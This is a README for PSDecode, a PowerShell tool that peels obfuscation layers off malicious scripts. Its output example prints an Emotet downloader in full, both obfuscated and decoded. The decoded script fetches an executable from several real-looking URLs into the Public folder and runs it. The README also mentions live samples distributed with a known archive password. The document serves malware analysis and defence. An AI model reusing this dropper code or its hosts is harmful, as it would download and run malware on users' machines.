# PSDecode
This is a PowerShell script for deobfuscating other encoded PowerShell scripts. Often, malicious PowerShell scripts have several layers of encodings  (Replace, Base64Decode, etc...) that, once decoded, are executed via a call to Invoke-Expression (IEX, &, .), Invoke-Command, etc... This script employs a technique called method overriding that enables us to essentially intercept calls to functions that I have accounted for within this script and print out the arguments being passed to it (a.k.a what the script was trying to execute).

** Important Note #1: Only run this script within an isolated sandbox. If the encoded powershell attempts to execute a function which I have not accounted for, there is a chance it could execute**

** Important Note #2: The default execution policy for PowerShell is Restricted and if you dont use PowerShell a lot, chances are when you go to run this script, it will give you an error stating "PSDecode cannot be loaded because the execution of scripts is disabled on this system". If you receive this message, you'll need to change you execution policy to Unrestricted either temporarility or permanantly. The simplest way is to open a PowerShell command prompt as Administrator and run: set-executionpolicy unrestricted**

# To Use
1. Copy PSDecode.psm1 into $PSHome\Modules\
2. Open a new instance of PowerShell
3. Option #1 [Pass encoded PowerShell via File]:
<pre> > PSDecode .\encoded_ps.ps1</pre>
or if the malicious script is Unicode:
<pre> > PSDecode .\uencoded_ps.ps1 -u</pre>
4. Option #2 [Pass encoded PowerShell via PIPE]:
<pre> > Get-Content .\encoded_ps.ps1 | PSDecode </pre>

# Optional Parameter
  -u: Default file encoding expected is ASCII. This switch tells PSDecode that the script being decoded is Unicode encoded.

# Example Powershell Scripts:
In this repository, I've included Emotet_PowerShell_Examples.zip, which contains a few different **LIVE** emotet PowerShell scripts. You can use these to play around with PSDecode and get a better understanding of how it is supposed to function. It is important to note that **these examples are malicious** and could potentially result in an infection if handled improperly. These are provided for educational purposes only and I assume no responsibility for what you do with them. You've been warned.

The password for the archive is: **infected**

# Output Example
```PowerShell
############################## Layer 1 ##############################
&( $vERBOSEprefeRENCE.TOstRInG()[1,3]+'x'-jOiN'')(('. ((VAriAble rAb*m'+'DR*rAb)'+'.namE[3,11,'+'2]-joiNrAbrAb) ( (rAb ((8mrAb+rAb6o4Vfranc r'+'Ab+rAb8m6+8m6=rAb+rAb new-8m6'+'+8m6obj8m6+8m6ec
rAb+rAbt SysrAb+rAbt8m6+8m6em.Ne'+'t'+'.We8m6rAb+rAb+8m6bCli8m6+8m6enrAb+rAbt8rAb+rAbm6+8m6;8m6+8m6o4Vnsa8m6+8m6dasd 8m6+'+'8m6= n8m6+8m6e8m6+8m6w-8m6+8m6object 8m6+'+'rAb+rAb8mrAb+rAb6random;
o4Vb8m6+8m6c8m6+8m6d = Ha6ht8m6+8m6t8m6+8m6p:8m6+8m6//s8m6+8m6mart8m6+8m6'+'-8m6+8m6soft.pl/w8m6+8m6ef3rAb+rAb8m6+8m64668m6+8m6'+'48m6+8rAb+rAbm658m6+8m6,htt8m6+8mrAb+rAb6p8m6+8m6:rAb+rAb8m6+8
m6/'+'8m6+8m6/chimach8m6+8m6i8m6+8m6n8m6+8m6eno8m6+8m6w.com/wrAb+rAb8m6'+'+8m6efrAb+rAb348m6+8m666458m'+'6+8m6,htt8m6+8mrAb+rAb6prAb+rAb://8m6+'+'8m6truhlarstvi-be8m6+8m6'+'zd8m6+8m'+'6eka8m6+
8rAb+rA'+'bm6.c8m6+8rAb+rAbm6z/wef346645,h8m6+8m6ttrAb+rAb8m6+8m6p8m6+8m6://8m6+8m6er8m6+8m6icajoy.co8m6+8m6m/8m6+8m6wef3468m6+8m6645Ha6.Sp8mrAb+rAb6+8m6lit(H8m6+8m6a6,H8rAb+rAbm6+8m6a6'+')8m6
+8rAb+r'+'Abm6;8m6+8m6o4V8m6+8m6kara8m6+8m6pas = o8m6+8m64'+'Vns8m6+8m6adasd.next(18m6+8m6,rAb+rA'+'b 38m6+8m6rAb+rAb43248m6+8m658m6+8mrAb+rAb6);o4Vhuas = o4Ve8m6+8m6nv:p8m6+8m6ublic +8m6rAb+r
Ab+8m6 Ha61U8m6+8m6nH'+'8m6'+'+8m6a6 +rAb+rAb o48m6+8m6Vkar'+'8m6+8m6apas 8m6+8m6+ Ha6.e8m6+8m6xe8m6+8m6Ha'+'8m6+8m668m6+8m6;8m6rAb+rAb+8m6for8m6+8m6ea'+'c8m6+8m6h(o8m6+8m64VrAb+rAbab8m6+8m6c 
in 8m6+8m6o48m6+8m6Vb8m6+8m6c8m6+8m6d){'+'8m6+8m6try{o48m6+8m6'+'V8m6+8m6f8m6+8m6r8m6'+'+8m6a8m6+8m6n8m'+'6r'+'Ab+rAb+8m6c.Downlo8m6+8m6adFile(o4Vab8m6+8rAb+rAbm6c8m6+8m6.TrAb+rAboSt8m6+8m6r8m
6+8m6in8m6+8m6g(8m6+8m6)8m6+8m6, o48m6+8m6Vhua8m6+8m6s);Invoke-Item(o4Vhuas);8m6+'+'8m6br8m6+8m6eak;}catch8m6'+'+8m6{wrrAb'+'+rAb8m6+'+'8m6i8m6+8m6te8m6+8m6-host'+' rAb+rAbo48rAb+rAbm6'+'+8m6V
_.Ex8m6+8m6c'+'e8m6+8m6pt8'+'m6+8rAb+rAbm6ion8m6'+'+8m6.MrAb+rAb8m6+8m6es8m6+8mrAb+rAb6rAb+'+'rAbsa8m6+8m6g8m6+8m'+'6e;}}8'+'m6'+')-CREpLACE 8m61Un8m6'+','+'[chaR]92 -CrA'+'b'+'+rAbREprAb+rAbL
ACE([chaR]111+[chaR]52+[chaR]86)'+',[cha'+'R]36 -CR'+'EpLACE ([chrAb+rAbaR]72+[chaR]97+[chaR]54),[chaR]39) f5B &((GeT-VaRIAbLe rAb+rAb8m6*MDR*8m6).Name[3,11,2]'+'-JoIn8m68m6)rAb).rEpLA'+'Ce(([
'+'c'+'har]5'+'6+[char]109+[c'+'har]54),[StRiNG][char]39).rE'+'pLAC'+'e(rAbf5BrAb,[StRiNG][char]124) ) ').rEPLAcE('rAb',[StRING][ChAr]39) )


############################## Layer 2 ##############################
. ((VAriAble '*mDR*').namE[3,11,2]-joiN'') ( (' ((8m'+'6o4Vfranc '+'8m6+8m6='+' new-8m6+8m6obj8m6+8m6ec'+'t Sys'+'t8m6+8m6em.Net.We8m6'+'+8m6bCli8m6+8m6en'+'t8'+'m6+8m6;8m6+8m6o4Vnsa8m6+8m6das
d 8m6+8m6= n8m6+8m6e8m6+8m6w-8m6+8m6object 8m6+'+'8m'+'6random;o4Vb8m6+8m6c8m6+8m6d = Ha6ht8m6+8m6t8m6+8m6p:8m6+8m6//s8m6+8m6mart8m6+8m6-8m6+8m6soft.pl/w8m6+8m6ef3'+'8m6+8m64668m6+8m648m6+8'+'
m658m6+8m6,htt8m6+8m'+'6p8m6+8m6:'+'8m6+8m6/8m6+8m6/chimach8m6+8m6i8m6+8m6n8m6+8m6eno8m6+8m6w.com/w'+'8m6+8m6ef'+'348m6+8m666458m6+8m6,htt8m6+8m'+'6p'+'://8m6+8m6truhlarstvi-be8m6+8m6zd8m6+8m6
eka8m6+8'+'m6.c8m6+8'+'m6z/wef346645,h8m6+8m6tt'+'8m6+8m6p8m6+8m6://8m6+8m6er8m6+8m6icajoy.co8m6+8m6m/8m6+8m6wef3468m6+8m6645Ha6.Sp8m'+'6+8m6lit(H8m6+8m6a6,H8'+'m6+8m6a6)8m6+8'+'m6;8m6+8m6o4V8
m6+8m6kara8m6+8m6pas = o8m6+8m64Vns8m6+8m6adasd.next(18m6+8m6,'+' 38m6+8m6'+'43248m6+8m658m6+8m'+'6);o4Vhuas = o4Ve8m6+8m6nv:p8m6+8m6ublic +8m6'+'+8m6 Ha61U8m6+8m6nH8m6+8m6a6 +'+' o48m6+8m6Vka
r8m6+8m6apas 8m6+8m6+ Ha6.e8m6+8m6xe8m6+8m6Ha8m6+8m668m6+8m6;8m6'+'+8m6for8m6+8m6eac8m6+8m6h(o8m6+8m64V'+'ab8m6+8m6c in 8m6+8m6o48m6+8m6Vb8m6+8m6c8m6+8m6d){8m6+8m6try{o48m6+8m6V8m6+8m6f8m6+8m6
r8m6+8m6a8m6+8m6n8m6'+'+8m6c.Downlo8m6+8m6adFile(o4Vab8m6+8'+'m6c8m6+8m6.T'+'oSt8m6+8m6r8m6+8m6in8m6+8m6g(8m6+8m6)8m6+8m6, o48m6+8m6Vhua8m6+8m6s);Invoke-Item(o4Vhuas);8m6+8m6br8m6+8m6eak;}catc
h8m6+8m6{wr'+'8m6+8m6i8m6+8m6te8m6+8m6-host '+'o48'+'m6+8m6V_.Ex8m6+8m6ce8m6+8m6pt8m6+8'+'m6ion8m6+8m6.M'+'8m6+8m6es8m6+8m'+'6'+'sa8m6+8m6g8m6+8m6e;}}8m6)-CREpLACE 8m61Un8m6,[chaR]92 -C'+'REp'
+'LACE([chaR]111+[chaR]52+[chaR]86),[chaR]36 -CREpLACE ([ch'+'aR]72+[chaR]97+[chaR]54),[chaR]39) f5B &((GeT-VaRIAbLe '+'8m6*MDR*8m6).Name[3,11,2]-JoIn8m68m6)').rEpLACe(([char]56+[char]109+[cha
r]54),[StRiNG][char]39).rEpLACe('f5B',[StRiNG][char]124) ) 


############################## Layer 3 ##############################
 (('o4Vfranc '+'= new-'+'obj'+'ect Syst'+'em.Net.We'+'bCli'+'ent'+';'+'o4Vnsa'+'dasd '+'= n'+'e'+'w-'+'object '+'random;o4Vb'+'c'+'d = Ha6ht'+'t'+'p:'+'//s'+'mart'+'-'+'soft.pl/w'+'ef3'+'466'+
'4'+'5'+',htt'+'p'+':'+'/'+'/chimach'+'i'+'n'+'eno'+'w.com/w'+'ef34'+'6645'+',htt'+'p://'+'truhlarstvi-be'+'zd'+'eka'+'.c'+'z/wef346645,h'+'tt'+'p'+'://'+'er'+'icajoy.co'+'m/'+'wef346'+'645Ha6
.Sp'+'lit(H'+'a6,H'+'a6)'+';'+'o4V'+'kara'+'pas = o'+'4Vns'+'adasd.next(1'+', 3'+'4324'+'5'+');o4Vhuas = o4Ve'+'nv:p'+'ublic +'+' Ha61U'+'nH'+'a6 + o4'+'Vkar'+'apas '+'+ Ha6.e'+'xe'+'Ha'+'6'+'
;'+'for'+'eac'+'h(o'+'4Vab'+'c in '+'o4'+'Vb'+'c'+'d){'+'try{o4'+'V'+'f'+'r'+'a'+'n'+'c.Downlo'+'adFile(o4Vab'+'c'+'.ToSt'+'r'+'in'+'g('+')'+', o4'+'Vhua'+'s);Invoke-Item(o4Vhuas);'+'br'+'eak;
}catch'+'{wr'+'i'+'te'+'-host o4'+'V_.Ex'+'ce'+'pt'+'ion'+'.M'+'es'+'sa'+'g'+'e;}}')-CREpLACE '1Un',[chaR]92 -CREpLACE([chaR]111+[chaR]52+[chaR]86),[chaR]36 -CREpLACE ([chaR]72+[chaR]97+[chaR]
54),[chaR]39) | &((GeT-VaRIAbLe '*MDR*').Name[3,11,2]-JoIn'')


############################## Layer 4 ##############################
$franc = new-object System.Net.WebClient;$nsadasd = new-object random;$bcd = 'http://smart-soft.pl/wef346645,http://chimachinenow.com/wef346645,http://truhlarstvi-bezdeka.cz/wef346645,http://e
ricajoy.com/wef346645'.Split(',');$karapas = $nsadasd.next(1, 343245);$huas = $env:public + '\' + $karapas + '.exe';foreach($abc in $bcd){try{$franc.DownloadFile($abc.ToString(), $huas);Invoke
-Item($huas);break;}catch{write-host $_.Exception.Message;}}


############################## Actions ##############################
1. [System.Random] Generate random integer between 1 and 343245 . Value returned: 92672
2. [System.Net.WebClient.DownloadFile] Download from: http://smart-soft.pl/wef346645
3. [System.Net.WebClient.DownloadFile] Save downloaded file to: C:\Users\Public\92672.exe
4. [Invoke-Item] Execute/Open: C:\Users\Public\92672.exe
```
# Change Log
* 2018.06.05
  * Included -u switch that users will need to specify if the powershell script they are attempting to decode is Unicode encoded.
  * Updated script to properly handle the presence of whitespace characters wrapped in quotes.
* 2018.05.30
  * Added better handling of double quotes during script building to eliminate hard failure.
  * Implemented replace function to replace the string concatenation '+' that could be found within a malicious script with an empty string. Eliminates simple obfuscation in layer output.
* 2018.03.20 - updated script to account for changes made to newest version of Emotet's encoding scheme
